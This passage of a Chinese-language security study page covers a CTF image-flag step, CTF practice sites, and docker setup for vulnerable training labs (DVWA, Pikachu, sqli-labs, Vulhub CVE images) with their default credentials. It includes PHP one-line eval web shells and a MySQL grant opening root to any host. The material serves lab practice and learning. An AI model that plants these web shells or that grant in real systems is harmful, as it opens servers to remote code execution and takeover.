<p>
解压后得到一张图片，从图片中获取flag：
</p>


<figure id="org36f4829">
<img src="./images/img_20230718_164237.png" alt="img_20230718_164237.png" width="50%">

</figure>

<p>
扫描二维码，是CTFhub的微信公众号：
之前在学习文件上传时说过，可以通过16进制工具查看文件的真实内容，使用010editor查看，发现
flag：
</p>


<figure id="org471f1be">
<img src="./images/img_20230718_164310.png" alt="img_20230718_164310.png" width="50%">

</figure>

<ul class="org-ul">
<li>Mac版 <a href="https://hexfiend.com/">hexfiend</a> 下载地址：<a href="https://github.com/HexFiend/HexFiend/releases">https://github.com/HexFiend/HexFiend/releases</a></li>
</ul>

<p>
或者使用命令行
</p>
<div class="org-src-container">
<pre class="src src-sh">hexdump -C ctfhub.png
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:717eef06-67cd-4074-b014-e89d9d559ebb" class="outline-3">
<h3 id="h:717eef06-67cd-4074-b014-e89d9d559ebb">压缩文件爆破</h3>
<div class="outline-text-3" id="text-h:717eef06-67cd-4074-b014-e89d9d559ebb">
<p>
压缩文件爆破工具: ARCHPR
</p>
</div>
<div id="outline-container-h:745d8afc-4ab4-41be-82d5-97ab10c9f44f" class="outline-4">
<h4 id="h:745d8afc-4ab4-41be-82d5-97ab10c9f44f">图片base64</h4>
<div class="outline-text-4" id="text-h:745d8afc-4ab4-41be-82d5-97ab10c9f44f">
<div class="org-src-container">
<pre class="src src-sh">&lt;img <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"data:image/png;base64,xxxxx"</span> <span style="color: #a0522d;">alt</span>=<span style="color: #8b2252;">""</span>&gt;
</pre>
</div>

<p>
再介绍几个现成的Web 漏洞 CTF 在线练习环境
</p>
<ul class="org-ul">
<li>CTF TIME : <a href="https://ctftime.org/">https://ctftime.org/</a></li>
<li>XCTF攻防世界 ：<a href="https://adworld.xctf.org.cn">https://adworld.xctf.org.cn</a></li>
<li>SQL注入挑战平台 ：<a href="http://redtiger.labs.overthewire.org">http://redtiger.labs.overthewire.org</a></li>
<li>韩国 Web 安全挑战平台 ：<a href="https://webhacking.kr/">https://webhacking.kr/</a></li>
<li>Websec CTF练习平台 ：<a href="http://www.websec.fr/">http://www.websec.fr/</a></li>
<li>网络信息安全攻防学习平台 ：<a href="http://hackinglab.cn/index.php">http://hackinglab.cn/index.php</a></li>
<li>国外的 XSS 挑战平台 ：<a href="http://prompt.ml/">http://prompt.ml/</a></li>
</ul>
</div>
</div>
</div>
</section>
<section id="outline-container-h:dbc4c345-9122-4d7e-8300-a81b723964c6" class="outline-2">
<h2 id="h:dbc4c345-9122-4d7e-8300-a81b723964c6">其它漏洞</h2>
<div class="outline-text-2" id="text-h:dbc4c345-9122-4d7e-8300-a81b723964c6">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>渗透测试之其它漏洞</li>
<li>登录页面渗透测试常用的几种思路与总结</li>
</ul>
</div>
</section>
<section id="outline-container-h:1efd2dff-04cf-4da6-9c13-f73a3d5b157f" class="outline-2">
<h2 id="h:1efd2dff-04cf-4da6-9c13-f73a3d5b157f">靶场</h2>
<div class="outline-text-2" id="text-h:1efd2dff-04cf-4da6-9c13-f73a3d5b157f">
</div>
<div id="outline-container-h:89509a7f-3efd-415c-9663-dc1f0591eeb2" class="outline-3">
<h3 id="h:89509a7f-3efd-415c-9663-dc1f0591eeb2">dvwa</h3>
<div class="outline-text-3" id="text-h:89509a7f-3efd-415c-9663-dc1f0591eeb2">
<p>
DVWA（Damn Vulnerable Web Application）是一款比较著名的漏洞靶场，很多
Web 安全的初学者都会拿它来练习，一些高校以及相关书籍里面也会介绍它。
</p>

<p>
DVWA的项目开源地址为<a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a>。
</p>

<div class="org-src-container">
<pre class="src src-sh">docker run -d --name dvwa -p 8080:80 -p 33060:3306 sagikazarmark/dvwa
docker run -d --name dvwa2 -p 8082:80 -p 33060:3306 citizenstig/dvwa <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf Medium &#20195;&#30721;&#19982;&#35838;&#20214;&#23545;&#24212;&#65292;&#25152;&#20197;&#29992;&#36825;&#20010;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36134;&#21495;admin &#23494;&#30721;password</span>
</pre>
</div>

<p>
停止及删除容器
</p>
<div class="org-src-container">
<pre class="src src-shell">$ docker stop dvwa
$ docker rm dvwa
</pre>
</div>

<p>
环境
</p>
<ul class="org-ul">
<li>PHP 5.6.30</li>
<li>Apache 2.4.10</li>
<li>MySQL 5.5.54</li>
</ul>

<p>
用户名/密码
</p>
<div class="org-src-container">
<pre class="src src-shell">User: root
Password: p@ssw0rd
Database: dvwa
</pre>
</div>

<p>
MySQL general_log 已开启（默认位置 /var/log/mysql/mysql.log ：），以便可以监控查询
</p>
<div class="org-src-container">
<pre class="src src-sql">show variables <span style="color: #a020f0;">like</span> <span style="color: #8b2252;">'general_log'</span>; <span style="color: #b22222;">-- </span><span style="color: #b22222;">&#26597;&#30475;&#26085;&#24535;&#26159;&#21542;&#24320;&#21551;</span>
<span style="color: #a020f0;">set</span> <span style="color: #a020f0;">global</span> general_log=<span style="color: #a020f0;">on</span>; <span style="color: #b22222;">-- </span><span style="color: #b22222;">&#24320;&#21551;&#26085;&#24535;&#21151;&#33021;</span>
show variables <span style="color: #a020f0;">like</span> <span style="color: #8b2252;">'general_log_file'</span>; <span style="color: #b22222;">-- </span><span style="color: #b22222;">&#30475;&#30475;&#26085;&#24535;&#25991;&#20214;&#20445;&#23384;&#20301;&#32622;</span>
<span style="color: #a020f0;">set</span> <span style="color: #a020f0;">global</span> general_log_file=<span style="color: #8b2252;">'/var/log/mysql/mysql.log'</span>; <span style="color: #b22222;">-- </span><span style="color: #b22222;">&#35774;&#32622;&#26085;&#24535;&#25991;&#20214;&#20445;&#23384;&#20301;&#32622;</span>
</pre>
</div>

<p>
初始化
</p>

<p>
访问 <a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a> 输入初始用户名密码
</p>
<ul class="org-ul">
<li>User: root</li>
<li>Password: p@ssw0rd</li>
</ul>

<p>
点击 Create/Reset Database 进行初始化
</p>

<p>
重新登录页面
</p>
<ul class="org-ul">
<li>User: admin</li>
<li>Password: password</li>
</ul>

<p>
选择项目难度，初始设置为Low
</p>


<p>
左边栏：（各漏洞利用模块）
</p>
<ul class="org-ul">
<li>Brute Fore 暴力破解</li>
<li>Command Injection 命令注入</li>
<li>CSRF</li>
<li>File Inclusion 文件包含</li>
<li>File Upload  文件上传</li>
<li>Insecure CAPTCHA</li>
<li>SQL Injection  SQL注入</li>
<li>SQL Injection (Blind)  SQL盲注</li>
<li>XSS (Reflected) 反射型跨站</li>
<li>XSS (Stored) 存储型跨站攻击</li>
</ul>

<p>
View Source 可以看到漏洞代码
</p>

<p>
靶场难度等级：DVMA Security
</p>
<ul class="org-ul">
<li>Low 低等级，限制措施少</li>
<li>Medium，High  可能要考虑绕过的方法</li>
<li>Impossible 不可能有漏洞</li>
</ul>
</div>
</div>
<div id="outline-container-h:354a4335-99cf-453b-a523-f0c9e1959fea" class="outline-3">
<h3 id="h:354a4335-99cf-453b-a523-f0c9e1959fea">pikachu</h3>
<div class="outline-text-3" id="text-h:354a4335-99cf-453b-a523-f0c9e1959fea">
<p>
Pikachu 也是一款 Web 漏洞靶场，涵盖各种 Web 漏洞类型的练习，也是基于
PHP+MySQL搭建的平台，是由国人开发的。平台采用中文描述和基本的页面设计，
相比sqli-labs 这种单调的界面还是好看很多的。
</p>

<p>
Pikachu的项目开源地址为
<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a>]]。
</p>


<div class="org-src-container">
<pre class="src src-sh">docker pull area39/pikachu
docker run -d --name pikachu -p 8083:80 -p 33063:3306 area39/pikachu
</pre>
</div>

<p>
点击红色字体进行初始化:
</p>
<ul class="org-ul">
<li>"提示:欢迎使用,pikachu还没有初始化，点击进行初始化安装!" &#x2013;&gt; "安装/初始化" &#x2013;&gt; "点击这里进入首页"</li>
</ul>
</div>
</div>
<div id="outline-container-h:29ed530f-5d3a-4b8b-b466-71e5a365b7e9" class="outline-3">
<h3 id="h:29ed530f-5d3a-4b8b-b466-71e5a365b7e9">sqli-labs</h3>
<div class="outline-text-3" id="text-h:29ed530f-5d3a-4b8b-b466-71e5a365b7e9">
<p>
sqli-labs 是一款用于学习 SQL 注入的靶场平台，覆盖了各种类型的 SQL注
入， 题目共 75 道，按难度划分为 4 页。
</p>

<p>
源地址为 <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">docker run -dt --name sqli-labs -p 8085:80 --rm acgpiano/sqli-labs
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7655600d-d1cd-4b5e-a960-5e8de254f405" class="outline-3">
<h3 id="h:7655600d-d1cd-4b5e-a960-5e8de254f405">upload-labs</h3>
<div class="outline-text-3" id="text-h:7655600d-d1cd-4b5e-a960-5e8de254f405">
<div class="org-src-container">
<pre class="src src-sh">docker run --name upload-labs -d -p 8084:80 cuer/upload-labs
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b5f8d3eb-5ced-4483-8137-881a3bee4d0b" class="outline-3">
<h3 id="h:b5f8d3eb-5ced-4483-8137-881a3bee4d0b">webug</h3>
<div class="outline-text-3" id="text-h:b5f8d3eb-5ced-4483-8137-881a3bee4d0b">
<div class="org-src-container">
<pre class="src src-sh">docker run -d -p 8082:80 -p 33060:3306 area39/webug <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25903;&#20184;&#28431;&#27934; &#40664;&#35748;&#36134;&#21495;&#65306;admin/admin &#25968;&#25454;&#24211;&#36134;&#21495;&#65306;root/toor</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a4690935-f815-40d2-a35f-31ac1a99d2ed" class="outline-3">
<h3 id="h:a4690935-f815-40d2-a35f-31ac1a99d2ed">漏洞利用</h3>
<div class="outline-text-3" id="text-h:a4690935-f815-40d2-a35f-31ac1a99d2ed">
<p>
VulHub 真实漏洞靶场
</p>

<p>
Vulhub 是一款基于 Docker 和 docker-compose的漏洞测试靶场，进入对应目
录 并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，
让安 全研究者更加专注于漏洞原理本身。Vulhub的项目开源地址为
<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a>。
</p>

<p>
我们需要先从 GitHub 上下载 VulHub，然后进行相应目录去创建和运行容器
</p>

<div class="org-src-container">
<pre class="src src-sh">$ git clone https://github.com/vulhub/vulhub
$ cd vulhub/flask/ssti
$ sudo docker-compose up -d
</pre>
</div>


<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">Tomcat PUT &#26041;&#27861;&#20219;&#24847;&#20889;&#25991;&#20214;&#28431;&#27934;(CVE-2017-12615)</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">Tomcat&#29256;&#26412;&#65306;7.0.0-7.0.79&#12289;8.5.19</span>
docker run --rm -d --name tomcat -p 8080:8080 docker.io/cved/cve-2017-12615

<span style="color: #b22222;">#</span><span style="color: #b22222;">S2-048 &#36828;&#31243;&#20195;&#30721;&#25191;&#34892;&#28431;&#27934;&#65288;CVE-2017-9791&#65289;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#24433;&#21709;&#29256;&#26412;: 2.0.0 - 2.3.32</span>
docker run --rm --name s2-048 -d -p 8082:8080 docker.io/piesecurity/apache-struts2-cve-2017-5638

<span style="color: #b22222;">#</span><span style="color: #b22222;">JBoss 5.x/6.x &#21453;&#24207;&#21015;&#21270;&#28431;&#27934;&#65288;CVE-2017-12149&#65289;</span>
docker run --rm --name cve-2017-12149 -d -p 8083:8080 docker.io/hackingpub/cve-2017-12149
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php phpinfo();?&gt;
&lt;?php eval(@$<span style="color: #a0522d;">_GET</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
&lt;?php eval(@$<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);?&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">docker start $(<span style="color: #ff00ff;">docker ps -a -q</span>)
docker stop $(<span style="color: #ff00ff;">docker ps -a -q</span>)

docker rm -f <span style="color: #ff00ff;">`docker ps -a -q`</span>
docker rm <span style="color: #ff00ff;">`docker ps -qf status=exited`</span>
</pre>
</div>


<div class="org-src-container">
<pre class="src src-sh">grant all privileges on *.* to root@<span style="color: #8b2252;">'%'</span> identified by <span style="color: #8b2252;">'root'</span>;
</pre>
</div>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
